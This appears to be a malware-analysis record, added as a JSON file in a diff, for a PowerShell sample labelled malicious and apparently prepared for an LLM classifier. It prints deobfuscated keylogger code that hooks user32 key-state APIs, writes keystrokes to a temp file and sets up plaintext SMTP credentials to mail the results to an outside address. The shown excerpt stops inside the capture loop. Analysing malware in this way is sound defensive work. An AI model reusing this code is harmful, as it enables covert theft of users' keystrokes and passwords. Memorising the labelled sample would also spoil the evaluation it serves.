@@ -1,0 +1,100 @@
+{
+  "meta": {
+    "quelldatei": "046d4048e859b77f86cc4f0e583276a80b02f15c85565d56a7ef0ad2a60db917.ps1",
+    "sha256": "046d4048e859b77f86cc4f0e583276a80b02f15c85565d56a7ef0ad2a60db917",
+    "groesse_bytes": 3163,
+    "zeilen": 94,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "noreplay.info.01@gmail.com",
+      "subxtrion#1996",
+      "krzarpon@mail.com",
+      "Keylogger Results",
+      "smtp.mail.com",
+      "587",
+      "$env:temp\\keylogger.txt",
+      "\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \r\npublic static extern short GetAsyncKeyState(int virtualKeyCode); \r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int GetKeyboardState(byte[] keystate);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\r\n",
+      "Win32"
+    ],
+    "string_anzahl_gesamt": 10,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "noreplay.info.01@gmail.com",
+      "subxtrion#1996",
+      "krzarpon@mail.com",
+      "Keylogger Results",
+      "smtp.mail.com",
+      "587",
+      "$env:temp\\keylogger.txt",
+      "\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \r\npublic static extern short GetAsyncKeyState(int virtualKeyCode); \r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int GetKeyboardState(byte[] keystate);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\r\n",
+      "Win32"
+    ],
+    "string_anzahl_gesamt": 10,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-Date",
+      "New-Item",
+      "New-Object",
+      "Remove-Item",
+      "Start-KeyLogger",
+      "Start-Sleep"
+    ],
+    "auffaellige_tokens": {
+      "add_type": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:temp\\keylogger.txt"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "noreplay.info.01@gmail.com",
+      "subxtrion#1996",
+      "krzarpon@mail.com",
+      "Keylogger Results",
+      "smtp.mail.com",
+      "587",
+      "$env:temp\\keylogger.txt",
+      "\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \r\npublic static extern short GetAsyncKeyState(int virtualKeyCode); \r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int GetKeyboardState(byte[] keystate);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\r\n",
+      "Win32"
+    ],
+    "string_anzahl_gesamt": 10,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Add-Type",
+      "Get-Date",
+      "New-Item",
+      "New-Object",
+      "Remove-Item",
+      "Start-KeyLogger",
+      "Start-Sleep"
+    ],
+    "auffaellige_tokens": {
+      "add_type": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:temp\\keylogger.txt"
+      ]
+    },
+    "deobfuskiert_auszug": "# Edit only this section!\r\n$TimesToRun = 1\r\n$RunTimeP = 1                       # Time in minutes\r\n$From = \"noreplay.info.01@gmail.com\"\r\n$Pass = \"subxtrion#1996\"\r\n$To = \"krzarpon@mail.com\"\r\n$Subject = \"Keylogger Results\"\r\n$body = \"Keylogger Results\"\r\n$SMTPServer = \"smtp.mail.com\"\r\n$SMTPPort = \"587\"\r\n$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)\r\n############################\r\n\r\n\r\n$TimeStart = Get-Date\r\n$TimeEnd = $timeStart.addminutes($RunTimeP)\r\n\r\n#requires -Version 2\r\nfunction Start-KeyLogger($Path=\"$env:temp\\keylogger.txt\") \r\n{\r\n  # Signatures for API Calls\r\n  $signatures = @'\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] \r\npublic static extern short GetAsyncKeyState(int virtualKeyCode); \r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int GetKeyboardState(byte[] keystate);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int MapVirtualKey(uint uCode, int uMapType);\r\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\r\npublic static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);\r\n'@\r\n\r\n  # load signatures and make members available\r\n  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru\r\n    \r\n  # create output file\r\n  $null = New-Item -Path $Path -ItemType File -Force\r\n\r\n  try\r\n  {\r\n\r\n    # create endless loop. When user presses CTRL+C, finally-block\r\n    # executes and shows the collected key presses\r\n    $Runner = 0\r\n\twhile ($TimesToRun  -ge $Runner) {\r\n\twhile ($TimeEnd -ge $TimeNow) {\r\n      Start-Sleep -Milliseconds 40\r\n      \r\n      # scan all ASCII codes above 8\r\n      for ($ascii = 9; $ascii -le 254; $ascii++) {\r\n        # get current key state\r\n        $state = $API::GetAsyncKeyState($ascii)\r\n\r\n        # is key pressed?\r\n        if ($state -eq -32767) {\r\n          $null = [console]::CapsLock\r\n\r\n       ",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
